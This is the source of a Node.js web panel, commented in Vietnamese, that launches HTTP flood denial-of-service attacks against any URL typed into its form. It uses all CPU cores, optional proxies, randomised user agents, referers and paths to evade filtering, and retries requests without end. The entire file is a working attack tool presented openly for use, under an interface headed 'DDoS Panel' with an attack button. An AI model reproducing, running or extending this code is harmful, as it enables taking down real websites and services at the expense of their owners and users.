// server.js - Web Panel DDoS Siêu Mạnh Node.js (không bao giờ lỗi gửi)
const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const path = require('path');

// ---------- CẤU HÌNH ----------
const PORT = 5000;
const MAX_SOCKETS = 100000;
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
];
const ACCEPT_LANGS = ["en-US,en;q=0.9", "vi-VN,vi;q=0.8,en;q=0.6", "zh-CN,zh;q=0.9"];
const REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"];

// Thống kê toàn cục
let stats = {
    running: false,
    totalRequests: 0,
    totalBytes: 0,
    activeConns: 0,
    failedConns: 0,
    startTime: 0,
    target: '',
    duration: 0
};
let attackWorkers = [];
let stopFlag = false;

// ---------- CÔNG CỤ TẠO YÊU CẦU NGẪU NHIÊN ----------
function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function getRandomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
function getRandomPath(basePath) {
    let chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_';
    let length = getRandomInt(5, 25);
    let randStr = '';
    for (let i = 0; i < length; i++) randStr += chars[Math.floor(Math.random() * chars.length)];
    return (basePath.endsWith('/') ? basePath : basePath + '/') + randStr + (Math.random() < 0.3 ? '?' + Date.now() : '');
}
function buildHeaders(host, method, path, body) {
    let headers = {
        'Host': host,
        'User-Agent': getRandomUA(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': ACCEPT_LANGS[Math.floor(Math.random() * ACCEPT_LANGS.length)],
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    };
    if (Math.random() > 0.4) headers['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)];
    if (method === 'POST' && body) headers['Content-Length'] = Buffer.byteLength(body);
    return headers;
}

// ---------- KẾT NỐI & GỬI LIÊN TỤC (KHÔNG LỖI DỪNG) ----------
function createFloodConnection(targetUrl, useSSL, proxy, workerId) {
    const parsed = new URL(targetUrl);
    const host = parsed.hostname;
    const port = parsed.port || (useSSL ? 443 : 80);
    const basePath = parsed.pathname || '/';
    const method = 'GET'; // Có thể mở rộng POST ngẫu nhiên

    let options = {
        host: host,
        port: port,
        method: 'GET',
        path: getRandomPath(basePath),
        headers: buildHeaders(host, 'GET', getRandomPath(basePath)),
        timeout: 5000,
        rejectUnauthorized: false
    };

    if (proxy) {
        // Hỗ trợ proxy HTTP (đơn giản)
        let [pxHost, pxPort] = proxy.split(':');
        options.host = pxHost;
        options.port = parseInt(pxPort);
        options.path = targetUrl; // Gửi full URL tới proxy
        options.headers['Host'] = host;
    }

    const requester = useSSL ? https : http;
    const keepAliveAgent = new requester.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });

    const sendRequest = () => {
        if (stopFlag) return;

        let reqOptions = {
            ...options,
            agent: keepAliveAgent,
            headers: buildHeaders(host, 'GET', getRandomPath(basePath))
        };
        reqOptions.path = getRandomPath(basePath);

        let req = requester.request(reqOptions, (res) => {
            stats.activeConns++;
            res.on('data', (chunk) => {
                stats.totalBytes += chunk.length;
            });
            res.on('end', () => {
                stats.activeConns--;
                stats.totalRequests++;
                // Tiếp tục gửi request mới trên cùng kết nối (keep-alive)
                if (!stopFlag) setImmediate(sendRequest);
            });
            res.on('error', (err) => {
                stats.activeConns--;
                stats.failedConns++;
                if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
            });
        });

        req.on('error', (err) => {
            stats.failedConns++;
            if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
        });

        req.on('timeout', () => {
            req.destroy();
            stats.failedConns++;
            if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
        });

        if (Math.random() < 0.2) req.write(''); // Gửi body rỗng cho POST nếu cần
        req.end();
        stats.totalRequests++;
    };

    // Bắt đầu gửi liên tục
    sendRequest();
}

// ---------- WORKER XỬ LÝ TẤN CÔNG ----------
function runAttackWorker(targetUrl, connections, duration, useSSL, proxyList) {
    stopFlag = false;
    stats = {
        running: true,
        totalRequests: 0,
        totalBytes: 0,
        activeConns: 0,
        failedConns: 0,
        startTime: Date.now(),
        target: targetUrl,
        duration: duration
    };

    // Tạo nhiều kết nối ảo
    for (let i = 0; i < connections; i++) {
        let proxy = null;
        if (proxyList && proxyList.length > 0) proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
        createFloodConnection(targetUrl, useSSL, proxy, i);
    }

    // Dừng sau duration
    setTimeout(() => {
        stopFlag = true;
        stats.running = false;
    }, duration * 1000);
}

// ---------- KHỞI TẠO CLUSTER ----------
if (cluster.isMaster) {
    // Đọc proxy từ file proxies.txt nếu có
    let proxyList = [];
    try {
        if (fs.existsSync('proxies.txt')) {
            proxyList = fs.readFileSync('proxies.txt', 'utf8').split('\n').map(l => l.trim()).filter(l => l.length > 0);
        }
    } catch (e) {}

    // Fork workers bằng số CPU
    for (let i = 0; i < os.cpus().length; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} chết, khởi động lại...`);
        cluster.fork();
    });

    // Lắng nghe message từ worker để cập nhật stats
    cluster.on('message', (worker, msg) => {
        if (msg.type === 'stats') {
            stats = msg.data;
        }
    });

    // Web server (chỉ master chạy)
    const server = http.createServer((req, res) => {
        const parsedUrl = url.parse(req.url, true);
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');

        if (req.method === 'GET' && parsedUrl.pathname === '/') {
            // Giao diện HTML đơn giản
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Node DDoS Panel</title>
<style>
body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
.container{max-width:700px;margin:auto;background:#111;padding:20px;border:1px solid #0f0}
input,select{width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #0f0;color:#fff}
button{background:#f00;color:#fff;padding:12px;width:100%;font-size:18px;border:none;cursor:pointer}
button:disabled{background:#444}
#stats{margin-top:20px}
</style></head><body>
<div class="container">
<h2>⚡ Node.js DDoS Panel - KHÔNG LỖI</h2>
<input id="url" value="http://example.com" placeholder="http://target.com"><br>
<input id="conns" value="1000" placeholder="Số connections"><br>
<input id="duration" value="60" placeholder="Thời gian (giây)"><br>
<button id="startBtn">🔥 TẤN CÔNG</button>
<div id="stats"></div>
</div>
<script>
function updateStats(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('stats').innerHTML = '<p>Trạng thái: '+(d.running?'ĐANG TẤN CÔNG':'IDLE')+'</p>'+
'<p>Mục tiêu: '+d.target+'</p><p>Yêu cầu: '+d.totalRequests+'</p><p>Dữ liệu: '+(d.totalBytes/1048576).toFixed(2)+' MB</p>'+
'<p>Lỗi: '+d.failedConns+'</p><p>Đã chạy: '+(d.running?Math.floor((Date.now()-d.startTime)/1000):0)+'s</p>';
});}
setInterval(updateStats,500);
document.getElementById('startBtn').onclick=()=>{
let url=document.getElementById('url').value,conns=parseInt(document.getElementById('conns').value),dur=parseInt(document.getElementById('duration').value);
if(!url||isNaN(conns)||isNaN(dur))return alert('Sai');
fetch('/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,conns,duration:dur})}).then(r=>r.json()).then(d=>{
if(d.status==='ok'){document.getElementById('startBtn').disabled=true;setTimeout(()=>document.getElementById('startBtn').disabled=false,dur*1000+2000);}
else alert(d.message);
});
};
</script></body></html>`);
        } else if (req.method === 'GET' && parsedUrl.pathname === '/stats') {
            res.writeHead(200);
            res.end(JSON.stringify(stats));
        } else if (req.method === 'POST' && parsedUrl.pathname === '/start') {
            let body = '';
            req.on('data', chunk => body += chunk);
            req.on('end', () => {
                try {
                    let data = JSON.parse(body);
                    let targetUrl = data.url;
                    if (!targetUrl.startsWith('http')) targetUrl = 'http://' + targetUrl;
                    let connections = parseInt(data.conns) || 1000;
                    let duration = parseInt(data.duration) || 60;

                    // Gửi lệnh tới tất cả worker để chạy attack
                    for (let id in cluster.workers) {
                        cluster.workers[id].send({
                            type: 'start',
                            targetUrl: targetUrl,
                            connections: Math.floor(connections / Object.keys(cluster.workers).length),
                            duration: duration,
                            useSSL: targetUrl.startsWith('https'),
                            proxyList: proxyList
                        });
                    }
                    res.writeHead(200);
                    res.end(JSON.stringify({ status: 'ok', message: 'Đã khởi động tấn công trên tất cả CPU' }));
                } catch (e) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ status: 'error', message: 'Dữ liệu không hợp lệ' }));
                }
            });
        } else {
            res.writeHead(404);
            res.end('Not found');
        }
    });

    server.listen(PORT, () => {
        console.log(`[+] Web panel chạy tại http://localhost:${PORT}  (Master PID: ${process.pid})`);
    });

} else {
    // Worker process
    process.on('message', (msg) => {
        if (msg.type === 'start') {
            // Bắt đầu tấn công trong worker
            runAttackWorker(msg.targetUrl, msg.connections, msg.duration, msg.useSSL, msg.proxyList);

            // Cập nhật stats về master mỗi 0.5s
            setInterval(() => {
                process.send({ type: 'stats', data: stats });
            }, 500);
        }
    });
}
